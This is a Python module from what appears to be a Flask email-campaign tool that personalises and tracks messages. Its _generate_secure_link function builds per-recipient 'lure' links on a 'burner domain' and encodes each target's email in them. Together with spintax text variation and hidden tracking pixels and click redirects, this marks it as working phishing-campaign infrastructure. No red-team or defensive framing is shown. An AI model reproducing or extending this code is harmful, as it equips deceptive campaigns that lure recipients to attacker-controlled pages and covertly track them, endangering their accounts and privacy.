import re
import json
import random
import uuid
import base64
from datetime import datetime, timedelta
from flask import url_for, current_app
from urllib.parse import urlparse, urlunparse

try:
    import css_inline
    CSS_INLINE_AVAILABLE = True
except ImportError: 
    CSS_INLINE_AVAILABLE = False


COMMON_ISP_DOMAINS = {
    "gmail.com", "yahoo.com", "hotmail.com", "aol.com", "outlook.com",
    "msn.com", "live.com", "icloud.com", "mail.com", "comcast.net",
    "verizon.net", "att.net", "sbcglobal.net", "cox.net", "yandex.com",
    "protonmail.com", "zoho.com", "gmx.com", "fastmail.com", "hey.com",
    "tutanota.com", "riseup.net", "disroot.org", "mail.ru", "qq.com"
}

GENERIC_EMAIL_WORDS = {
    'info', 'contact', 'admin', 'support', 'sales', 'mail', 'email',
    'hello', 'test', 'demo', 'user', 'customer', 'press', 'jobs',
    'careers', 'service', 'team', 'office', 'billing', 'accounts',
    'dev', 'webmaster', 'media', 'noreply', 'no-reply', 'marketing',
    'newsletter', 'updates', 'general', 'enquiry', 'staff', 'manager',
    'hr', 'recruitment', 'inquiries', 'help', 'feedback', 'postmaster'
}


class SmartSendTimeCalculator:
    """Calculate optimal send times based on recipient data."""
    
    TIMEZONE_OFFSETS = {
        'US/Eastern': -5,
        'US/Central': -6,
        'US/Mountain': -7,
        'US/Pacific': -8,
        'Europe/London': 0,
        'Europe/Paris': 1,
        'Europe/Berlin': 1,
        'Asia/Tokyo': 9,
        'Asia/Singapore': 8,
        'Australia/Sydney': 10,
    }
    
    OPTIMAL_HOURS = {
        'business': [9, 10, 11, 14, 15, 16],
        'consumer': [10, 11, 12, 18, 19, 20],
        'default': [9, 10, 11, 14, 15]
    }
    
    OPTIMAL_DAYS = [1, 2, 3, 4]
    
    def __init__(self):
        self.engagement_data = {}
    
    def get_optimal_send_time(self, recipient, campaign_type='business'):
        """Calculate optimal send time for a recipient."""
        domain = recipient.email.split('@')[1].lower() if '@' in recipient.email else None
        
        timezone = self._detect_timezone(domain, recipient)
        optimal_hours = self.OPTIMAL_HOURS.get(campaign_type, self.OPTIMAL_HOURS['default'])
        
        engagement = self._get_engagement_patterns(recipient)
        if engagement and engagement.get('best_hour'):
            optimal_hours = [engagement['best_hour']] + optimal_hours[:4]
        
        hour = random.choice(optimal_hours)
        minute = random.randint(0, 59)
        
        now = datetime.utcnow()
        target = now.replace(hour=hour, minute=minute, second=0, microsecond=0)
        
        if timezone:
            offset = self.TIMEZONE_OFFSETS.get(timezone, 0)
            target = target - timedelta(hours=offset)
        
        if target < now:
            target += timedelta(days=1)
        
        while target.weekday() not in self.OPTIMAL_DAYS: 
            target += timedelta(days=1)
        
        return target
    
    def _detect_timezone(self, domain, recipient):
        """Attempt to detect recipient timezone."""
        try:
            data = json.loads(recipient.data) if recipient.data else {}
            if 'timezone' in data: 
                return data['timezone']
        except:
            pass
        
        if domain: 
            tld = domain.split('.')[-1]
            tld_timezones = {
                'us': 'US/Eastern',
                'uk': 'Europe/London',
                'de': 'Europe/Berlin',
                'fr': 'Europe/Paris',
                'jp': 'Asia/Tokyo',
                'au': 'Australia/Sydney',
                'sg': 'Asia/Singapore',
            }
            if tld in tld_timezones:
                return tld_timezones[tld]
        
        return None
    
    def _get_engagement_patterns(self, recipient):
        """Get historical engagement patterns for recipient."""
        if recipient.email in self.engagement_data:
            return self.engagement_data[recipient.email]
        
        if recipient.opened_at:
            return {'best_hour': recipient.opened_at.hour}
        
        return None
    
    def update_engagement_data(self, email, opened_at=None, clicked_at=None):
        """Update engagement data for a recipient."""
        if email not in self.engagement_data:
            self.engagement_data[email] = {'opens': [], 'clicks': []}
        
        if opened_at: 
            self.engagement_data[email]['opens'].append(opened_at.hour)
        
        if clicked_at:
            self.engagement_data[email]['clicks'].append(clicked_at.hour)
        
        if self.engagement_data[email]['opens']: 
            from collections import Counter
            hours = Counter(self.engagement_data[email]['opens'])
            self.engagement_data[email]['best_hour'] = hours.most_common(1)[0][0]


class PersonalizationEngine:
    """Engine for personalizing email content."""
    
    def __init__(self, campaign, recipient):
        self.campaign = campaign
        self.recipient = recipient
        self.smart_send = SmartSendTimeCalculator()
    
    def _spin_text(self, text):
        """Process spintax {Hi|Hello|Hey} in text."""
        if not text:
            return text
        
        pattern = re.compile(r'\{([^{}]*)\}')
        
        while True:
            match = pattern.search(text)
            if not match:
                break
            
            options = match.group(1).split('|')
            text = text[:match.start()] + random.choice(options) + text[match.end():]
        
        return text
    
    def _get_context(self):
        """Build the context dictionary for template rendering."""
        try:
            context = json.loads(self.recipient.data) if self.recipient.data else {}
        except json.JSONDecodeError:
            context = {}
        
        context = {k.lower(): v for k, v in context.items()}
        
        if 'firstname' not in context or not context.get('firstname'):
            local_part = self.recipient.email.split('@')[0]
            potential_parts = re.split(r'[._\-+]+', local_part)
            valid_parts = [p for p in potential_parts if len(p) > 1 and p.isalpha()]
            
            if valid_parts and valid_parts[0].lower() not in GENERIC_EMAIL_WORDS: 
                context['firstname'] = valid_parts[0].capitalize()
            else:
                context['firstname'] = "there"
        
        if 'company' not in context or not context.get('company'):
            try:
                domain = self.recipient.email.split('@')[1].lower()
                if domain in COMMON_ISP_DOMAINS:
                    context['company'] = "your company"
                else:
                    parts = domain.split('.')
                    if len(parts) > 2 and len(parts[-2]) > 2 and parts[-2] not in ('co', 'com', 'org', 'net', 'gov', 'edu'):
                        company_part = parts[-2]
                    else:
                        company_part = parts[0]
                    context['company'] = '-'.join([p.capitalize() for p in company_part.split('-')])
            except Exception:
                context['company'] = "your company"
        
        now = datetime.now()
        hour = now.hour
        
        if 5 <= hour < 12:
            base_greeting = "Good morning"
        elif 12 <= hour < 18:
            base_greeting = "Good afternoon"
        else: 
            base_greeting = "Good evening"
        
        firstname = context.get('firstname', 'there')
        context['greetings'] = f"{base_greeting} {firstname}"
        context['greeting'] = context['greetings']
        context['currentdate'] = now.strftime("%B %d, %Y")
        context['date'] = context['currentdate']
        context['time'] = now.strftime("%I:%M %p")
        context['year'] = now.strftime("%Y")
        context['month'] = now.strftime("%B")
        context['day'] = now.strftime("%d")
        context['dayofweek'] = now.strftime("%A")
        
        if self.campaign.smtp_profile: 
            context['sender_name'] = self.campaign.smtp_profile.sender_name or "Sender"
            context['sender_email'] = self.campaign.smtp_profile.sender_email or ""
        else:
            context['sender_name'] = "Sender"
            context['sender_email'] = ""
        
        context['secure_link'] = self._generate_secure_link()
        
        try:
            unsubscribe_token = self.recipient.get_tracking_token('unsubscribe')
            # FIXED: Point to tracking.unsubscribe
            context['unsubscribe_link'] = url_for('tracking.unsubscribe', token=unsubscribe_token, _external=True)
            context['unsubscribe_url'] = context['unsubscribe_link']
        except Exception:
            context['unsubscribe_link'] = "#"
            context['unsubscribe_url'] = "#"
        
        context['email'] = self.recipient.email
        context['recipient_id'] = self.recipient.id
        context['campaign_name'] = self.campaign.name
        
        return context
    
    def _generate_secure_link(self):
        """Generate a secure redirector link."""
        burner_domain = self.campaign.burner_domain
        lure_path = self.campaign.lure_path
        
        if not burner_domain:
            try:
                from app.models import GlobalSettings
                global_settings = GlobalSettings.query.first()
                if global_settings:
                    burner_domain = global_settings.burner_domain
                    lure_path = lure_path or global_settings.lure_path
            except Exception:
                pass
        
        if not burner_domain: 
            return "#"
        
        parsed_domain = urlparse(burner_domain)
        if not parsed_domain.scheme:
            burner_domain = "https://" + burner_domain
            parsed_domain = urlparse(burner_domain)
        
        nonce = str(uuid.uuid4())
        target_id = base64.urlsafe_b64encode(self.recipient.email.encode()).decode()
        clean_path = lure_path.lstrip('/') if lure_path else ""
        
        final_url = urlunparse((
            parsed_domain.scheme,
            parsed_domain.netloc,
            clean_path,
            '',
            f'id={target_id}&nonce={nonce}',
            ''
        ))
        
        return final_url
    
    def _render_template(self, template_string, context):
        """Replace placeholders with values."""
        if not template_string: 
            return ""
        
        result = template_string
        
        result = re.sub(r'\[([a-zA-Z0-9_]+)\]', r'{{\1}}', result)
        
        for key, value in context.items():
            pattern = r'\{\{\s*' + re.escape(str(key)) + r'\s*\}\}'
            result = re.sub(pattern, str(value) if value else '', result, flags=re.IGNORECASE)
        
        result = re.sub(r'\{\{[^}]+\}\}', '', result)
        
        return result
    
    def _add_tracking_pixel(self, html_content):
        """Inject a 1x1 tracking pixel."""
        if not self.campaign.tracking_enabled:
            return html_content
        
        try:
            open_token = self.recipient.get_tracking_token('open')
            # FIXED: Point to tracking.track_open
            open_url = url_for('tracking.track_open', campaign_id=self.campaign.id, recipient_id=self.recipient.id, _external=True)
            pixel_img = f'<img src="{open_url}" width="1" height="1" alt="" border="0" style="height:1px;width:1px;border:0;display:none;"/>'
            
            if '</body>' in html_content.lower():
                return re.sub(r'</body>', f'{pixel_img}</body>', html_content, flags=re.IGNORECASE)
            return html_content + pixel_img
        except Exception:
            return html_content
    
    def _replace_links_for_tracking(self, html_content):
        """Replace href links with tracking endpoints."""
        if not self.campaign.tracking_enabled:
            return html_content
        
        try:
            def replace_link(match):
                original_url = match.group(2)
                
                if any(x in original_url for x in ['mailto:', '#', 'unsubscribe', '/track/', 'nonce=', 'javascript:']):
                    return match.group(0)
                
                try:
                    encoded_url = base64.urlsafe_b64encode(original_url.encode()).decode()
                    # FIXED: Point to tracking.track_click
                    tracked_url = url_for('tracking.track_click', campaign_id=self.campaign.id, recipient_id=self.recipient.id, url=encoded_url, _external=True)
                    return f'{match.group(1)}="{tracked_url}"'
                except Exception:
                    return match.group(0)
            
            return re.sub(r'(href\s*=\s*)(["\'](https?://[^"\']+)["\'])', replace_link, html_content, flags=re.IGNORECASE)
        except Exception:
            return html_content
    
    def _inline_css(self, html_content):
        """Inline CSS for email compatibility."""
        if CSS_INLINE_AVAILABLE: 
            try:
                inliner = css_inline.CSSInliner()
                return inliner.inline(html_content)
            except Exception:
                pass
        return html_content
    
    def _html_to_plain(self, html):
        """Convert HTML to plain text."""
        if not html:
            return ""
        
        text = re.sub(r'<(script|style).*?>.*?</\1>', '', html, flags=re.DOTALL | re.IGNORECASE)
        text = re.sub(r'</(p|h[1-6]|li|div|tr)\s*>', '\n', text, flags=re.IGNORECASE)
        text = re.sub(r'<br\s*/?>', '\n', text, flags=re.IGNORECASE)
        text = re.sub(r'<[^>]+>', ' ', text)
        text = re.sub(r'&nbsp;', ' ', text)
        text = re.sub(r'&amp;', '&', text)
        text = re.sub(r'&lt;', '<', text)
        text = re.sub(r'&gt;', '>', text)
        text = re.sub(r'\s+', ' ', text)
        
        lines = [line.strip() for line in text.split('\n')]
        return '\n'.join(line for line in lines if line)
    
    def _select_ab_content(self):
        """Select A or B version based on A/B testing settings."""
        if not self.campaign.ab_testing_enabled:
            return self.campaign.subject, self.campaign.body_html
        
        email_hash = hash(self.recipient.email) % 100
        split_ratio = self.campaign.ab_split_ratio or 50
        
        if email_hash < split_ratio:
            self.recipient.ab_version = 'A'
            return self.campaign.subject, self.campaign.body_html
        else:
            self.recipient.ab_version = 'B'
            subject = self.campaign.subject_b if self.campaign.subject_b else self.campaign.subject
            body = self.campaign.body_b if self.campaign.body_b else self.campaign.body_html
            return subject, body
    
    def get_optimal_send_time(self, campaign_type='business'):
        """Get optimal send time for this recipient."""
        return self.smart_send.get_optimal_send_time(self.recipient, campaign_type)
    
    def personalize(self):
        """Main personalization pipeline."""
        context = self._get_context()
        
        subject, body_html = self._select_ab_content()
        
        subject = self._spin_text(subject)
        body_html = self._spin_text(body_html)
        
        final_subject = self._render_template(subject, context)
        final_body_html = self._render_template(body_html, context)
        
        final_body_html = self._inline_css(final_body_html)
        
        final_body_html = self._replace_links_for_tracking(final_body_html)
        final_body_html = self._add_tracking_pixel(final_body_html)
        
        final_body_plain = self._html_to_plain(final_body_html)
        
        return final_subject, final_body_html, final_body_plain
